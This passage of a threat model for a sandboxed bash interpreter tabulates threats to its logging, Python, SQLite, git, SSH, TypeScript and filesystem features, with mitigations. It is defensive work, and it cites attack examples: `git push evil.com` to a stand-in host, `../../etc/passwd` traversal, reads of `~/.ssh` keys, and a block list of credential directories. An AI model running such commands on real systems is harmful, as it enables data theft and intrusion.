| Path leak in errors (TM-INT-004) | Error shows real FS paths | Virtual paths only | MITIGATED |
| Memory addr in errors (TM-INT-005) | Debug output shows addresses | Display impl hides addresses | MITIGATED |
| Stack trace exposure (TM-INT-006) | Panic unwinds show call stack | `catch_unwind` prevents propagation | MITIGATED |
| /dev/urandom empty with head -c (TM-INT-007) | `head -c 16 /dev/urandom` returns empty | Fix virtual device pipe handling | **MITIGATED** |
| C ABI unwind (TM-INT-008) | Rust panic enters a foreign runtime or leaks details | Catch every exported operation and return a generic error | **MITIGATED** |
| Binary output bypasses resource limits (TM-INT-009) | Invalid UTF-8 exceeds configured caps when counted as text | Byte-native accumulation and callbacks truncate by exact byte length | **MITIGATED** |
| Invalid UTF-8 line input panics (TM-INT-010) | `read`/`select` apply a lossy-text newline offset to raw pipeline bytes | Line consumers find and split newlines in the authoritative byte buffer | **MITIGATED** |
| Command resolver panic (TM-INT-011) | Unresolved command name triggers a panic in embedder resolver code | `catch_unwind` wrapper and sanitized shell error | **MITIGATED** |

**Panic Recovery:**

All builtins (both built-in and custom) are wrapped with panic catching:

```text
If a builtin panics, the script continues with a sanitized error.
The panic message is NOT exposed (may contain sensitive data).
Output: "bash: <command>: builtin failed unexpectedly"
```

**Error Message Safety:**

Error messages never expose:
- Stack traces or call stacks
- Memory addresses
- Real filesystem paths (only virtual paths)
- Panic messages that may contain secrets

### Logging Security (TM-LOG-*)

When the `logging` feature is enabled, Bashkit emits structured logs. Security features
prevent sensitive data leakage:

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Secrets in logs (TM-LOG-001) | Log `$PASSWORD` value | Env var redaction | MITIGATED |
| Script leak (TM-LOG-002) | Log script with embedded secrets | Script content disabled by default | MITIGATED |
| URL credentials (TM-LOG-003) | Log `https://user:pass@host` | URL credential redaction | MITIGATED |
| API key leak (TM-LOG-004) | Log JWT or API key values | Entropy-based detection | MITIGATED |
| Log injection (TM-LOG-005) | Script with `\n[ERROR]` | Newline escaping | MITIGATED |
| Control char injection (TM-LOG-006) | ANSI escapes in logs | Control char filtering | MITIGATED |
| Log flooding (TM-LOG-007) | Excessive script output | Value truncation | MITIGATED |
| Large value DoS (TM-LOG-008) | Log very long strings | `max_value_length` limit (200) | MITIGATED |

**Logging Configuration:**

```rust,ignore
use bashkit::{Bash, LogConfig};

// Default: secure (redaction enabled, script content hidden)
let bash = Bash::builder()
    .log_config(LogConfig::new())
    .build();

// Add custom redaction patterns
let bash = Bash::builder()
    .log_config(LogConfig::new()
        .redact_env("MY_CUSTOM_SECRET"))
    .build();
```

**Warning:** Do not use `LogConfig::unsafe_disable_redaction()` or
`LogConfig::unsafe_log_scripts()` in production.

## Parser Depth Protection

The parser includes multiple layers of depth protection to prevent stack overflow
attacks:

1. **Configurable depth limit** (`max_ast_depth`, default 100): Controls maximum nesting
   of compound commands (if/for/while/case/subshell).

2. **Hard cap** (`HARD_MAX_AST_DEPTH = 100`): Even if the caller configures a higher
   `max_ast_depth`, the parser clamps it to 100. This prevents misconfiguration from
   causing stack overflow.

3. **Child parser inheritance** (TM-DOS-021): When parsing `$(...)` or `<(...)`,
   the child parser inherits the *remaining* depth budget and fuel from the parent.
   This prevents attackers from bypassing depth limits through nested substitutions.

4. **Arithmetic depth limit** (TM-DOS-026): The arithmetic evaluator (`$((expr))`)
   has its own depth limit (`MAX_ARITHMETIC_DEPTH = 50`) to prevent stack overflow
   from deeply nested parenthesized expressions.

5. **Parser fuel** (`max_parser_operations`, default 100K): Independent of depth,
   limits total parser work to prevent CPU exhaustion.

### Python / Monty Security (TM-PY-*)

The `python`/`python3` builtins embed the Monty Python interpreter with VFS bridging.
Python `pathlib.Path` and `open()` operations are bridged to Bashkit's virtual filesystem.

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Infinite loop (TM-PY-001) | `while True: pass` | Monty time limit (30s) | MITIGATED |
| Memory exhaustion (TM-PY-002) | Large allocation | Monty max_memory (64MB), also caps collected `print` output | MITIGATED |
| Stack overflow (TM-PY-003) | Deep recursion | Monty max_recursion (200) | MITIGATED |
| Shell escape (TM-PY-004) | `os.system()` | Monty has no os.system/subprocess | MITIGATED |
| Real FS access (TM-PY-005) | `open()` | VFS bridge opens only Bashkit VFS files | MITIGATED |
| Error info leak (TM-PY-006) | Errors go to stdout | Errors go to stderr, not stdout | MITIGATED |
| Real FS read (TM-PY-015) | `Path.read_text()` | VFS bridge reads only from Bashkit VFS | MITIGATED |
| Real FS write (TM-PY-016) | `Path.write_text()` | VFS bridge writes only to Bashkit VFS | MITIGATED |
| Path traversal (TM-PY-017) | `../../etc/passwd` | VFS path normalization | MITIGATED |
| Bash/Python VFS isolation (TM-PY-018) | Cross-tenant access | Shared VFS by design; no cross-tenant | MITIGATED |
| Crash on missing file (TM-PY-019) | Missing file panic | FileNotFoundError raised, not panic | MITIGATED |
| Network access (TM-PY-020) | Socket/HTTP | Monty has no socket/network module | MITIGATED |
| VFS mkdir escape (TM-PY-021) | mkdir outside VFS | mkdir operates only in VFS | MITIGATED |
| VM crash (TM-PY-022) | Malformed input | Parser depth limit + resource limits | MITIGATED |
| Shell injection (TM-PY-023) | deepagents.py f-strings | Use shlex.quote() | **MITIGATED** |
| Heredoc escape (TM-PY-024) | Content contains delimiter | Random delimiter | **MITIGATED** |
| GIL deadlock (TM-PY-025) | execute_sync holds GIL | py.allow_threads() | **MITIGATED** |
| Config lost on reset (TM-PY-026) | reset() drops limits | Preserve config | **MITIGATED** |
| JSON recursion (TM-PY-027) | Nested dicts overflow stack | Add depth limit | **MITIGATED** |
| BashTool.reset() drops config (TM-PY-028) | reset() removes limits | Preserve config (match PyBash) | **MITIGATED** |
| Silent failure masks script errors (TM-PY-007) | Syntax error swallowed | Syntax errors return a non-zero exit code | MITIGATED |
| Exit-code spoofing across py/bash (TM-PY-008) | `sys.exit(N)` | Propagates N to bash `$?` | MITIGATED |
| Degenerate input crash (TM-PY-009) | `python -c ''` | Empty code fails gracefully with an error | MITIGATED |
| Error text leaks into pipeline (TM-PY-010) | Traceback into stdout | Tracebacks stay on stderr | MITIGATED |
| Command-subst captures diagnostics (TM-PY-011) | `$(python …)` grabs stderr | Captures stdout only | MITIGATED |
| Shell escape via `eval`/`exec` (TM-PY-012) | `eval("os.system(...)")` | Monty has no `os.system`/`subprocess`; eval'd code stays in the interpreter | MITIGATED |
| Unknown CLI options smuggle behavior (TM-PY-013) | Unknown `python` flag | Rejected with exit 2 | MITIGATED |
| Escapes Bashkit resource limits (TM-PY-014) | Bypass caps via Python | `ExecutionLimits` apply like any builtin | MITIGATED |
| Host clock disclosure (TM-PY-029) | `datetime.now()` exposes host time/timezone | Intentional, required for correct datetime semantics | ACCEPTED |
| GIL deadlock/exit crash via async callback (TM-PY-030) | Private-loop dispatch holds the GIL during teardown | Deterministic teardown: detach around dispatch, cancel in-flight callbacks, no attach at finalization | FIXED |
| ContextVar capture may include sensitive state (TM-PY-031) | `copy_context()` snapshots all caller ContextVars | Accepted: same semantics as `asyncio.Task` inheritance; caller controls what is set | ACCEPTED |

**Architecture:**

```text
Python code → Monty VM → OsCall pause → Bashkit VFS bridge → resume
```

Monty runs directly in the host process. Resource limits (memory, time,
recursion) are enforced by Monty's own runtime. All VFS operations are
bridged through the host process, Python code never touches the real filesystem.

### SQLite Security (TM-SQL-*)

The `sqlite`/`sqlite3` builtins embed Turso's pure-Rust SQLite-compatible engine.
This is experimental and **opt-in for now**. Library callers must enable the
`sqlite` feature, register the builtin with `.sqlite()` or `.sqlite_with_limits(...)`,
and set `BASHKIT_ALLOW_INPROCESS_SQLITE=1` before SQL executes. Without the
runtime opt-in, registered commands fail closed with a disabled error.

SQLite database files live in Bashkit's virtual filesystem, or in `:memory:`.
The default backend loads and flushes database bytes through the VFS at command
boundaries; the VFS backend implements Turso's IO trait over `Arc<dyn FileSystem>`.
Both paths are tested so SQL cannot intentionally read host files.

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| BETA engine execution (TM-SQL-001) | `sqlite :memory: 'SELECT 1'` without opt-in | Feature + builder registration + runtime opt-in gate | MITIGATED |
| Host FS escape (TM-SQL-002) | Open `/etc/passwd` as a database | All paths resolve through Bashkit VFS | MITIGATED |
| Large SQL input (TM-SQL-003) | Multi-MB SQL script | `max_script_bytes` | MITIGATED |
| Huge result set (TM-SQL-004) | Query returns millions of rows | `max_rows_per_query` | MITIGATED |
| Huge DB file (TM-SQL-005) | Load or grow oversized `.sqlite` file | `max_db_bytes` on both backends | MITIGATED |
| Wall-clock burn (TM-SQL-005a) | Expensive query/CTE | Per-step deadline + interrupt | MITIGATED |
| Statement flood (TM-SQL-005b) | Millions of `;` statements | `max_statements` | MITIGATED |
| Binary truncation (TM-SQL-006) | BLOB contains NUL bytes | `Vec<u8>` values, tested round-trip | MITIGATED |
| CSV injection/escape failure (TM-SQL-007) | Blob/text contains separator | RFC-4180 quoting | MITIGATED |
| Recursive `.read` (TM-SQL-008) | Script `.read`s itself | `MAX_DOT_READ_DEPTH` | MITIGATED |
| Cross-database access (TM-SQL-009) | `ATTACH DATABASE '/tmp/x'` | `ATTACH`/`DETACH` rejected by policy | MITIGATED |
| Dangerous PRAGMAs (TM-SQL-010) | `PRAGMA main."cache_size"=...` | Default `pragma_deny` list, including quoted/schema-qualified names | MITIGATED |
| Host path errors (TM-SQL-011) | Upstream error includes `/rustc/...` | Sanitizer strips host path annotations | MITIGATED |
| Unbounded work inside one engine step (TM-SQL-014) | `WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM r) SELECT count(*) FROM r` | VM progress handler charges the execution budget every 1024 instructions and interrupts on deadline/budget breach | MITIGATED |

Black-box coverage drives `Bash::exec` through
`tests/sqlite_integration_tests.rs` and `tests/sqlite_security_tests.rs`.
White-box coverage in `builtins/sqlite/tests.rs` exercises parser, policy,
formatter, sanitizer, backend, and dot-command internals directly.
Exploratory probing found and fixed two policy/limit gaps: quoted
schema-qualified PRAGMAs bypassed the deny list, and VFS-backed databases did
not honor custom `max_db_bytes` while growing.

### Git Security (TM-GIT-*)

Optional virtual git operations via the `git` feature. All operations are confined
to the virtual filesystem.

**Repository Access:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Host identity leak (TM-GIT-002) | Commit reveals real name/email | Configurable virtual identity | MITIGATED |
| Host git config (TM-GIT-003) | Read ~/.gitconfig | No host filesystem access | MITIGATED |
| Credential theft (TM-GIT-004) | Access credential store | No host filesystem access | MITIGATED |
| Repository escape (TM-GIT-005) | Clone outside VFS | All paths in VFS | MITIGATED |

**Git DoS:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Large repo clone (TM-GIT-006) | Clone huge repository | FS size limits | PLANNED (Phase 2) |
| Many git objects (TM-GIT-007) | Millions of objects | `max_file_count` FS limit | MITIGATED |
| Deep history (TM-GIT-008) | Very long commit log | Log limit parameter | MITIGATED |
| Large pack files (TM-GIT-009) | Huge .git/objects/pack | `max_file_size` FS limit | MITIGATED |

**Remote Operations (Phase 2):**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Unauthorized clone (TM-GIT-001) | `git clone evil.com` | Remote URL allowlist | PLANNED |
| Push to unauthorized (TM-GIT-010) | `git push evil.com` | Remote URL allowlist | PLANNED |
| Fetch from unauthorized (TM-GIT-011) | `git fetch evil.com` | Remote URL allowlist | PLANNED |
| SSH key access (TM-GIT-012) | Use host SSH keys | HTTPS only (no SSH) | PLANNED |
| Git protocol bypass (TM-GIT-013) | Use `git://` protocol | HTTPS only | PLANNED |
| Branch name injection (TM-GIT-014) | `git branch ../../config` | Validate branch names | **MITIGATED** |
| Terminal-escape injection via git metadata (TM-GIT-015) | Control chars in config/author/commit echoed by `git config`/`git log` | Control characters stripped on output | **MITIGATED** |

**Virtual Identity:**

```rust,ignore
use bashkit::Bash;

let bash = Bash::builder()
    .git_author("sandbox", "sandbox@example.com")
    .build();
// Commits use virtual identity, never host ~/.gitconfig
```

### SSH Security (TM-SSH-*)

The `ssh`/`scp`/`sftp` builtins (opt-in `ssh` feature) connect to remote hosts
through a sandboxed client. Connections are default-deny: callers must allowlist
each host via `SshConfig::allow(...)`, and credentials come only from the VFS,
never the host `~/.ssh/`.

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Unauthorized host access (TM-SSH-001) | Connect to arbitrary hosts | Host allowlist (default-deny) | MITIGATED |
| Credential leakage (TM-SSH-002) | Read host `~/.ssh/` keys | Keys from VFS only | MITIGATED |
| Session exhaustion (TM-SSH-003) | Open many concurrent sessions | Max concurrent sessions limit | MITIGATED |
| OOM via large response (TM-SSH-004) | Server sends huge output | Streaming size limit | MITIGATED |
| Connection hang (TM-SSH-005) | Server never responds | Configurable timeout | MITIGATED |
| MITM via unverified host key (TM-SSH-006) | Attacker intercepts connection | Strict host key checking (default: on); CA-signed host certificates are always rejected in strict mode — configure the host's public key directly | MITIGATED |
| Non-standard port access (TM-SSH-007) | Connect to services on unexpected ports | Port allowlist | MITIGATED |
| Remote command injection (TM-SSH-008) | Inject via remote path in SCP | Shell-escape remote paths | MITIGATED |

### TypeScript / ZapCode Security (TM-TS-*)

The `typescript` feature embeds the ZapCode runtime. Scripts run under
wall-clock, memory, allocation, and stack-depth limits, and all filesystem
access is bridged through Bashkit's VFS, never the host filesystem.

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Infinite loop (TM-TS-001) | `while (true) {}` | ZapCode time limit (default 30s) | MITIGATED |
| Memory exhaustion (TM-TS-002) | Large allocation | `max_memory` (64MB) + `max_allocations` (1M) | MITIGATED |
| Stack overflow (TM-TS-003) | Deep recursion | `max_stack_depth` (512) | MITIGATED |
| Allocation bomb (TM-TS-004) | Many small objects | `max_allocations` (1M) | MITIGATED |
| Real filesystem read (TM-TS-005) | Read host files via VFS | VFS bridge reads only Bashkit VFS | MITIGATED |
| VFS write escape (TM-TS-006) | Write to host | VFS bridge writes only Bashkit VFS | MITIGATED |
| Path traversal (TM-TS-007) | `../../etc/passwd` | Paths resolved within sandbox | MITIGATED |
| Host `/tmp` escape (TM-TS-011) | Operations escape to host | All operations through Bashkit VFS | MITIGATED |
| Limit bypass (TM-TS-018) | Evade Bashkit caps via TS | Command budget still enforced | MITIGATED |
| Bash/TS VFS data corruption (TM-TS-008) | Cross-tenant VFS access | Shared VFS by design; no cross-tenant access | MITIGATED |
| Crash on missing file (TM-TS-009) | Open a missing file | Error string returned, not a panic | MITIGATED |
| VFS mkdir escape (TM-TS-010) | mkdir outside VFS | mkdir operates only in VFS | MITIGATED |
| Error info leak via stdout (TM-TS-012) | Errors to stdout | Errors go to stderr, not stdout | MITIGATED |
| Syntax error crashes host (TM-TS-013) | Malformed TS | Non-zero exit, error on stderr | MITIGATED |
| Exit code not propagated (TM-TS-014) | `process.exit(N)` | Exit code flows to bash `$?` | MITIGATED |
| Empty code crashes (TM-TS-015) | `ts -c ''` | Non-zero exit, error message | MITIGATED |
| Pipeline error leakage (TM-TS-016) | Errors into pipe | Errors on stderr, not passed to the pipe | MITIGATED |
| Unknown options accepted (TM-TS-017) | Unknown flag | Unknown flags return non-zero | MITIGATED |
| Command-subst captures errors (TM-TS-019) | `$(ts …)` grabs stderr | Only stdout captured | MITIGATED |
| Shell execution from TS (TM-TS-021) | `child_process` / exec globals | No process/subprocess/exec globals | MITIGATED |
| Script reads host filesystem (TM-TS-022) | Load a host script | Script file loaded via VFS | MITIGATED |
| Shebang line injection (TM-TS-023) | `#!...` header | Shebang stripped safely | MITIGATED |
| Bash var expansion injection (TM-TS-020) | Unquoted `$VAR` expanded before TS runs | By design; use single quotes to prevent expansion | MITIGATED |

Per-threat coverage (TM-TS-001 … TM-TS-023), including error-isolation and
exit-code propagation cases, is also exercised by the `threat_ts_*` tests.

### Request Signing & Snapshot Integrity (TM-CRY-*, TM-SNAP-*)

The `bot-auth` request signer (Ed25519, RFC 9421) and the snapshot
serialization API both handle key material and integrity tags. The optional
`ssh` feature also brings in third-party RSA code, covered below.

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Private key recovery (TM-CRY-001) | Heap/core-dump inspection of the Ed25519 seed | `BotAuthConfig` zeroizes the seed in `Drop`; debug output redacts key material | MITIGATED |
| RSA timing sidechannel (TM-CRY-002) | A peer times RSA private-key operations during SSH public-key auth to recover the key (Marvin Attack, RUSTSEC-2023-0071) | No upstream fix exists, every published `rsa` version is affected. The crate is reachable only through the opt-in `ssh` feature (via `russh`/`ssh-key`); prefer Ed25519 keys, which do not use the affected path | ACCEPTED |
| Snapshot forgery (TM-SNAP-001) | Forge a valid digest using the public `BKSNAP01` tag | Keyed HMAC API (`to_bytes_keyed`/`from_bytes_keyed`) for tamper-evident snapshots | MITIGATED |
| Object store poisoning (TM-SNAP-002) | Substitute a different blob under a referenced object ID in the host's store | Every object is verified against its content hash on load; the graph is a Merkle tree, so a keyed commit authenticates everything it reaches | MITIGATED |
| Hash agility (TM-SNAP-003) | A snapshot claims a hash algorithm the reader does not implement | Algorithm ID in the container header, rejected when unknown | MITIGATED |
| Chunk or decompression bomb (TM-SNAP-004) | A small snapshot expands into an unbounded allocation during checkout | Per-object decompression capped; live filesystem file-size and total-byte limits enforced before chunk materialization | MITIGATED |
| Malformed object graph (TM-SNAP-005) | Cyclic parents, absurd declared entry counts, or a chunk served where a tree is expected | Kind tags checked against context, declared counts bounded before allocation, ancestry walks track visited commits | MITIGATED |
| Capability mismatch on restore (TM-SNAP-006) | State captured with tools or features the restoring instance lacks is restored into it silently | Per-commit capability fingerprint with a `Superset` default policy, plus state-evidence checks that fire under every policy | MITIGATED |

`from_bytes` uses `SHA-256(BKSNAP01 || payload)` (the tag is a public constant,
so it detects accidental corruption, not forgery); `from_bytes_keyed` uses
`HMAC-SHA256(secret_key, payload)` with a caller-provided key for authenticity.

Within a commit graph every object is named by `SHA-256(kind || payload)` and
re-verified when loaded, so authenticating the root commit transitively
authenticates the shell state, tree, and file chunks beneath it. Note that
object identity covers *decoded* content, not its compressed framing: a host
may recompress its store freely, while bytes appended after a compressed stream
are rejected.

### Host Filesystem Security (TM-FS-*)

Two features let a script reach storage outside the in-memory VFS: the `realfs`
feature, which mounts real host directories (read-only by default, gated by an
allowlist), and the wasm bindings' `new Bash({ fs })`, which routes the VFS into
an embedder-supplied JavaScript object.

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Permissive RealFs mount (TM-FS-013) | `mount_real_readonly_at("/", …)` exposes the whole host | Allowlist-first: broad roots (`/`, `/etc`, `/root`, `/home`, …) and any path component matching `.ssh`, `.aws`, `.kube`, `.docker`, `.gnupg`, `.gcloud` are refused unless explicitly allowlisted | MITIGATED |
| Partial filesystem mutation (TM-FS-014) | Failed write/copy or cross-mount move leaves corruption, duplication, or retained quota | Failure-atomic `FileSystem` contract; RealFs sibling staging; MountableFs destination rollback; NamespaceFs cross-device rejection; shared conformance + failpoint tests | MITIGATED |
| Partial tar extraction (TM-FS-015) | A late unsafe or malformed entry leaves earlier files behind | Validate the complete archive and file limits before the first VFS mutation | MITIGATED |
| yq in-place partial update (TM-FS-016) | A failed transform or write truncates the source file | Evaluate and serialize before writing; random sibling temporary file, mode preservation, and rename-on-success | MITIGATED |
| JS host filesystem widens the sandbox (TM-FS-017) | `new Bash({ fs })` gives a script whatever the embedder's object exposes | Paths are normalized by `PosixFs` before any host call, and reads of host-reported symlinks are rejected before reaching a potentially symlink-following host method. The host object *is* the boundary and is the embedder's to scope; its bytes also live outside the VFS quotas, so the embedder owns the storage limit | ACCEPTED (opt-in, embedder-scoped) |

### Unicode Security (TM-UNI-*)

Unicode input from untrusted scripts creates attack surface across the parser, builtins,
and virtual filesystem. AI agents frequently generate multi-byte Unicode (box-drawing,
emoji, CJK) that exercises these code paths.

**Byte-Boundary Safety (TM-UNI-001/002/015/016/017):**

Multiple builtins mix byte offsets with character indices, causing panics on multi-byte
input. All are caught by `catch_unwind` (TM-INT-001) preventing process crash, but the
builtin silently fails.

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Awk byte-boundary panic (TM-UNI-001) | Multi-byte chars in awk input | `catch_unwind` catches panic | PARTIAL |
| Sed byte-boundary panic (TM-UNI-002) | Multi-byte `s` delimiter, e.g. `sed 's≠a≠X≠'` | Char-based script parser; no byte slicing of script text | FIXED |
| Expr substr panic (TM-UNI-015) | `expr substr "café" 4 1` | `catch_unwind` catches panic | PARTIAL |
| Printf precision panic (TM-UNI-016) | `printf "%.1s" "é"` | `catch_unwind` catches panic | PARTIAL |
| Cut/tr byte-level parsing (TM-UNI-017) | `tr 'é' 'e'`, multi-byte in char set | `catch_unwind` catches; silent data loss | PARTIAL |

**Additional Byte/Char Confusion:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Interpreter arithmetic (TM-UNI-018) | Multi-byte before `=` in arithmetic | Wrong operator detection; no panic | PARTIAL |
| Network allowlist (TM-UNI-019) | Multi-byte in allowlist URL path | Wrong path boundary check | PARTIAL |

**Zero-Width and Invisible Characters:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Zero-width in filenames (TM-UNI-003) | Invisible chars create confusable names | Path validation (planned) | MITIGATED |
| Zero-width in variables (TM-UNI-004) | `\u{200B}PATH=malicious` | Matches Bash behavior | ACCEPTED |
| Zero-width in scripts (TM-UNI-005) | `echo "pass\u{200B}word"` | Correct pass-through | ACCEPTED |
| Tag char hiding (TM-UNI-011) | U+E0001-U+E007F in filenames | Path validation (planned) | MITIGATED |
| Annotation hiding (TM-UNI-012) | U+FFF9-U+FFFB in filenames | Not detected | MITIGATED |
| Deprecated format chars (TM-UNI-013) | U+206A-U+206F in filenames | Not detected | MITIGATED |

**Homoglyphs, Normalization, and Bidi:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Homoglyph filenames (TM-UNI-006) | Cyrillic 'а' vs Latin 'a' | Accepted risk | ACCEPTED |
| Homoglyph variables (TM-UNI-007) | Cyrillic in variable names | Matches Bash behavior | ACCEPTED |
| Normalization bypass (TM-UNI-008) | NFC vs NFD create distinct files | Matches Linux FS behavior | ACCEPTED |
| Bidi in script source (TM-UNI-014) | RTL overrides hide malicious code | Scripts untrusted by design | ACCEPTED |

**Combining Characters:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Excessive combiners in filenames (TM-UNI-009) | 1000 diacritical marks on one char | `max_filename_length` (255 bytes) | MITIGATED |
| Excessive combiners in builtins (TM-UNI-010) | Combiners in awk/grep patterns | Timeout + depth limits | MITIGATED |

**Safe Components (confirmed by full codebase audit):**
- Lexer: `Chars` iterator with `ch.len_utf8()` tracking
- wc: Correct `.len()` vs `.chars().count()` usage
- grep/jq: Delegate to Unicode-aware regex/jaq crates
- sort/uniq: String comparison, no byte indexing
- logging: Uses `is_char_boundary()` correctly
- python: Shebang strip via `find('\n')`, ASCII delimiter, safe
- Python bindings (bashkit-python): PyO3 `String` extraction, no manual byte/char ops
- eval harness: `chars().take()`, `from_utf8_lossy()`, all safe patterns
- curl/bc/export/date/comm/echo/archive/base64: All `.find()` use ASCII delimiters only
- bashkit-scripted-tool: No byte/char patterns

**Path Validation:**

Filenames are validated by `find_unsafe_path_char()` which rejects:
- ASCII control characters (U+0000-U+001F, U+007F)
- C1 control characters (U+0080-U+009F)
- Bidi override characters (U+202A-U+202E, U+2066-U+2069)

Normal Unicode (accented, CJK, emoji) is allowed in filenames and script content.

**Caller Responsibility:**
- Strip zero-width/invisible characters from filenames before displaying to users
- Apply confusable-character detection (UTS #39) if showing filenames to humans
- Strip bidi overrides from script source before displaying to code reviewers
- Be aware that expr/printf/cut/tr may fail on non-ASCII input until fixes land
- Use ASCII in network allowlist URL patterns until byte/char fix lands
